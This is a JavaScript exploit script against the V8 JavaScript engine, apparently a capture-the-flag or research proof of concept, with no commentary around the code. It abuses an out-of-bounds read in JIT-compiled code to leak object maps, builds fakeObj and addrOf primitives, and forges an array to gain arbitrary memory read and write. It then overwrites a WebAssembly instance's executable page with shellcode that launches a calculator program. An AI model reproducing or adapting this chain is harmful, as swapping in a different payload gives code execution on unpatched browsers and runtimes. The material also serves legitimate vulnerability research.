function hex(x)
{
	return '0x' + (x.toString(16)).padStart(16, 0);
}

function success(str, val){
    console.log("[+] " + str + " -> "+ hex(val));
}

class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var tC = new typeConvert();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;
var globalVal = [];

function getMapOpt(){
	let obj = [1.1, 2.2, 3.3];
	let arr = [obj, obj, obj];
	let tmp = {
		oobVal: obj.length
	};
	return [obj[tmp.oobVal], obj, arr];
}

for(let i=0; i < 0x12000; i++){
	getMapOpt();
}

function getMap(){
	let tmp = getMapOpt();
	globalVal.push(tmp[1]);
	globalVal.push(tmp[2]);
	return tmp[0];
}

// get float map
var floatMap = getMap();
success("floatMap",tC.f2u(floatMap));

// get obj map by offset
var objMap = tC.u2f(tC.f2u(floatMap)+0xa0);
success("objMap",tC.f2u(objMap));

function fakeObjOpt(fakeObjAddr){
	let arr = [fakeObjAddr, fakeObjAddr, fakeObjAddr];
	let tmp = {
		oobVal : arr.length
	};
	arr[tmp.oobVal] = objMap;
	return arr;
}

for(let i=0; i<0x12000; i++){
	fakeObjOpt(floatMap);
}

function fakeObj(fakeObjAddr){
	let tmp = fakeObjOpt(fakeObjAddr);
	return tmp[0];
}

// get fake obj map object
var floatMapObj = fakeObj(floatMap);
// console.log("floatMapObj "+hex(tC.f2u(floatMapObj)));

// build addrOf primitive
function addrOfOpt(obj){
	let arr = [obj, obj, obj];
	let tmp = {
		oobVal : arr.length
	};
	arr[tmp.oobVal] = floatMapObj;
	return arr;
}

var preObj = {
	floatMapObj
};
for(let i=0; i<0x12000; i++){
	addrOfOpt(preObj);
}

function addrOf(obj){
	let tmp = addrOfOpt(obj);
	return tmp[0];
}

// fake obj array
var fakeArray = [
	floatMap,				// fake map
	tC.u2f(0x0),			// fake properties
	tC.u2f(0x0),			// fake elements
	tC.u2f(0x100000000000),	// fake length
	1.1,
	1.2
].slice(0);

var maxSize = 1028 * 8;
var obj = [];
var array = [];
array.push(new ArrayBuffer(0x200));
obj.push({
		'a' : tC.u2f(0x1234),
		'b' : tC.u2f(0x5678) 
		});

// get fakeArray address
var fakeArrayAddr = tC.f2u(addrOf(fakeArray));
var oobArrayAddr = fakeArrayAddr - 0x30;
success("oobArrayAddr", oobArrayAddr);
// rewrite oobArray's element with a start_element_addr
fakeArray[2] = tC.u2f(fakeArrayAddr);

var oobArray = fakeObj(tC.u2f(oobArrayAddr));
// %DebugPrint(oobArray);

var controllableObjIdx = 0;
for(let i=0; i<maxSize; i++){
	if(tC.f2u(oobArray[i]) === 0x1234){
		controllableObjIdx = i;
		success("controllableObjIdx in oobArray",controllableObjIdx);
		break;
	}
}

// search backing_store
var controllableArrayBufIdx = 0;
for(let i=0; i<maxSize; i++){
	if(tC.f2u(oobArray[i]) === 0x200){
		controllableArrayBufIdx = i + 1;
		success("Backing_Store in oobArray",controllableArrayBufIdx);
		break;
	}
}

class ArbitraryRW{
	leakObj(newObj){
		obj[0].a = newObj;
		return tC.f2u(oobArray[controllableObjIdx]);
	}
	read(addr){
		oobArray[controllableArrayBufIdx] = tC.u2f(addr);
		let tmp = new Float64Array(array[0],0,0x10);
		return tC.f2u(tmp[0]);
	}
	write(addr, val){
		oobArray[controllableArrayBufIdx] = tC.u2f(addr);
		let tmp = new Float64Array(array[0],0,0x10);
		tmp[0] = tC.u2f(val);
	}
}

let wr=new ArbitraryRW();
var wasmInsAddr = wr.leakObj(wasmInstance);
success("wasmInsAddr", wasmInsAddr);

// var wasmInsAddr = addrOf(wasmInstance);
// success("wasmInsAddr", tC.f2u(wasmInsAddr));
// %DebugPrint(wasmInstance);
rwxAddrLoc = wasmInsAddr + 0xe8 - 0x1;
rwxAddr = wr.read(rwxAddrLoc);
success("rwxAddr",rwxAddr);

function showCalc(){
	shellcode = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];
	for(let i=0;i<shellcode.length;i++){
		wr.write(rwxAddr+i,shellcode[i]);
	}
	wasmFunc();	
}

showCalc();
